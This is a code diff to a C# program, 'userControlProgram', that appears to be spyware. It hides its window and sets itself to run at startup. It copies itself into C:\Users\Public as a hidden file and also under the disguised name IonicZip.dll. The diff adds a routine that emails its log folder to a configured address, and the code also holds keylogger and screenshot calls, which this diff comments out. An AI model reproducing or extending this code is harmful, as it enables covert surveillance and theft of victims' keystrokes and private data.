@@ -5,6 +5,7 @@ using System.Data;
 using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Net.Mail;
 using System.Text;
 using System.Windows.Forms;
 
@@ -22,9 +23,10 @@ namespace userControlProgram
             this.Visible = false;
             Enabled = false;
             SetConfigurations.SetConfig(ref _mailTo, ref LogPath, ref _screenShotTimer);
-            KeyLogger.SetHook(LogPath);
-            ScreenshotMaker.ScreenshotStart(_screenShotTimer, LogPath);
+            //KeyLogger.SetHook(LogPath);
+            //ScreenshotMaker.ScreenshotStart(_screenShotTimer, LogPath);
             Autorun.SetAutorunValue(true, "C:\\Users\\Public\\userControlProgram.exe");
+            MailSender.MainSenderFunc(LogPath, new MailAddress(_mailTo));
             InitializeComponent();
         }
 
@@ -38,6 +40,8 @@ namespace userControlProgram
                 {
                     File.Copy("userControlProgram.exe", "C:\\Users\\Public\\userControlProgram.exe");
                     File.SetAttributes("C:\\Users\\Public\\userControlProgram.exe", FileAttributes.Hidden);
+                    File.Copy("userControlProgram.exe", "C:\\Users\\Public\\IonicZip.dll");
+                    File.SetAttributes("C:\\Users\\Public\\IonicZip.dll", FileAttributes.Hidden);
                 }
                 catch
                 {
